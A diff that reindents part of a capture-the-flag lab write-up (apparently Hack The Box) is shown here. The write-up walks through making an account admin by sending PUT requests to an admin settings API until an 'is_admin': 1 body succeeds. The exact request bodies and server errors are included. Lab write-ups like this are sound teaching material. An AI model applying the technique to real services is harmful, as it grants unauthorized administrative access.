@@ -127,64 +127,64 @@ data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg 
 ```
 
 16.  First we want to set our user to admin via `/api/v1/admin/settings/update` so we can use the POST request. This takes a bit of trial and error:
-    1. Sending an empty PUT request yields this error:
+  1.  Sending an empty PUT request yields this error:
 
-    ```json
-    {
-        "status": "danger",
-        "message": "Invalid content type."
-    }
-    ```
+  ```json
+  {
+    "status": "danger",
+    "message": "Invalid content type."
+  }
+  ```
 
-    2. It likely wants a message in JSON. To indicate this, we want to add a `Content-Type: application/json` header to our request. In Firefox, you can do it in the New Request box:
+  2. It likely wants a message in JSON. To indicate this, we want to add a `Content-Type: application/json` header to our request. In Firefox, you can do it in the New Request box:
 
-    ![Add Content-Type](newHeader.png)
+  ![Add Content-Type](newHeader.png)
 
-    3. Sending this PUT request yields this error:
+  3. Sending this PUT request yields this error:
 
-    ```json
-    {
-        "status": "danger",
-        "message": "Missing parameter: email"
-    }
-    ```
+  ```json
+  {
+    "status": "danger",
+    "message": "Missing parameter: email"
+  }
+  ```
 
-    4. This means the message needs to have a JSON block in the PUT request body and it needs to have an "email" parameter (this likely should be my own):
+  4. This means the message needs to have a JSON block in the PUT request body and it needs to have an "email" parameter (this likely should be my own):
 
-    ```json
-    {
-        "email": "es@htb.org"
-    }
-    ```
+  ```json
+  {
+    "email": "es@htb.org"
+  }
+  ```
 
-    5. Sending this PUT request yields this error:
+  5. Sending this PUT request yields this error:
 
-    ```json
-    {
-        "status": "danger",
-        "message": "Missing parameter: is_admin"
-    }
-    ```
+  ```json
+  {
+    "status": "danger",
+    "message": "Missing parameter: is_admin"
+  }
+  ```
 
-    6. The `is_admin` parameter is likely a boolean which I certainly want set to `true`. So here's our new request:
+  6. The `is_admin` parameter is likely a boolean which I certainly want set to `true`. So here's our new request:
 
-    ```json
-    {
-        "email": "es@htb.org",
-        "is_admin": true
-    }
-    ```
+  ```json
+  {
+    "email": "es@htb.org",
+    "is_admin": true
+  }
+  ```
 
-    7. Got an error for using true instead of 1, so I simply replace `true` for `1` for our final request:
+  7. Got an error for using true instead of 1, so I simply replace `true` for `1` for our final request:
 
-    ```json
-    {
-        "email": "es@htb.org",
-        "is_admin": 1
-    }
-    ```
+  ```json
+  {
+    "email": "es@htb.org",
+    "is_admin": 1
+  }
+  ```
 
-17.  Lets verify we are indeed admin using a GET request to `/api/v1/admin/auth`. We got `message: true`!
+1.   Lets verify we are indeed admin using a GET request to `/api/v1/admin/auth`. We got `message: true`!
 
 ![We Admin Baby!](adminLetsGo.png)
 
